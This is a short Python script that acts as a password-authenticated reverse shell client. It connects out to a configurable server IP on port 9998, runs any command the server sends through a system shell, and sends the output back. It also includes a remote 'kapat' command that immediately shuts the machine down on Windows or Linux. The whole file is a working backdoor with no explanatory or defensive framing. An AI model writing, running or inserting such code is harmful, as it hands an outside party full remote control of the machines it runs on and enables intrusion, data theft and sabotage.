import socket
import subprocess
import os

PASSWORD = "StrongPassword"  # Change this to a strong password

s = socket.socket()
host = "127.0.0.1"  # Change this to your server's IP
port = 9998

try:
    s.connect((host, port))
    
    # Send password to server
    s.send(PASSWORD.encode())
    auth_response = s.recv(1024).decode()

    if auth_response != "AUTH_SUCCESS":
        print("Authentication failed! Closing connection.")
        s.close()
        exit()

    while True:
        command = s.recv(1024).decode().strip()
        if not command:
            break

        if command.lower() == "kapat":
            s.send(b"Shutting down...")

            # Shutdown command for Windows & Linux
            if os.name == "nt":  # Windows
                os.system("shutdown /s /t 0")
            else:  # Linux/macOS
                os.system("shutdown -h now")
                
            break

        if command.lower().startswith("touch "):  # Check if it's a "touch" command
            filename = command.split(" ", 1)[1]  # Get the file name
            try:
                with open(filename, 'w') as file:
                    file.write("")  # Create an empty file
                s.send(f"File {filename} created successfully.".encode())
            except Exception as e:
                s.send(f"Failed to create file {filename}: {str(e)}".encode())
        else:
            try:
                cmd = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                output = cmd.stdout.read() + cmd.stderr.read()
                s.sendall(output)
            except Exception as e:
                s.sendall(str(e).encode())
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()

